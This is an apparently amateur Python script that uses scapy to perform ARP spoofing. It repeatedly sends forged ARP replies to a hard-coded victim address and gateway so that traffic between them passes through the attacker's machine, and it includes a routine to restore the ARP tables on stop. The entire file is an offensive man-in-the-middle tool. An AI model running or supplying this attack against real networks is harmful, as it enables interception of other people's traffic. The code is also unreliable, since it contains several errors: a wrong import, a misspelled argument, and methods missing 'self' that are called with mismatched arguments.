import scapy 
import time
 
class arp_spoofing:

        def get_mac1(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/ arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
            return answered_list[0][1].hwsrc

        def get_mac(self, ip):
            '''return MAC address of any device connected to the network
            If ip is down return None'''
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/ arp_request
            answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
            if answered_list:
                return answered_list[0][1].src


        def spoof(target_ip, spoof_ip, verbose=True):
            '''
            Spoofs 'target_ip' saying that we are host_ip'''

            packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = arp_spoofing.get_mac(target_ip), psrc = spoof_ip)
            arp_spoofing.saved_packets.append(packet)
            scapy.send(packet, verbose = False)
            if verbose:
                #get the MAC address of the default interface we are using
                self_mac = scapy.ARP().hwsrc  
                print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))

        def restore(destination_ip, source_ip):
            destination_mac = arp_spoofing.get_mac(destination_ip)
            source_mac = arp_spoofing.get_mac(source_ip)
            packet = scapy.ARP(op = 2, pdst=destination_ip,
                    hwdst = destination_mac,
                    psrc = source_ip, hwsrc = source_mac)
            scapy.send(packet, verbose = False)



        def start():
            
            arp_spoofing.running = True

            # Initialize saved packets
            arp_spoofing.saved_packets = []
            
            #victom ip address
            arp_spoofing.target = '192.168.8.137'

            #gateway ip
            arp_spoofing.host = '192.168.8.243'

            arp_spoofing.verbose = True

            while arp_spoofing.running:
                #Telling the target that we are the host
                arp_spoofing.spoof(arp_spoofing.target, arp_spoofing.host, arp_spoofing.verbose)

                # Telling the host that we are the target
                arp_spoofing.spoof(arp_spoofing.host, arp_spoofing.target, arp_spoofing.verbose)

                # sleep for a second
                time.sleep(1)
                    
        def stop():

            print("[!] Detexcted CTRL+C! restoring the network, please wait")

            print(arp_spoofing.saved_packets)

            arp_spoofing.running = False

            arp_spoofing.restore(arp_spoofing.target, arp_spoofing.host)
            arp_spoofing.restore(arp_spoofing.host, arp_spoofing.target)